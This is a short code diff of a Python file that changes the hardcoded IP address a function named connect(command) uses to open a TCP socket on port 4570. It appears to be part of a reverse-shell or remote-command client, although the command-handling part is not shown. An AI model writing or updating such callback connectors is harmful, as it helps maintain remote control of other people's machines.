@@ -7,7 +7,7 @@ import os
 import socket
 
 def connect(command):
-    ip = '3.26.216.143'
+    ip = '54.79.26.131'
     port = 4570
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.connect((ip, port))
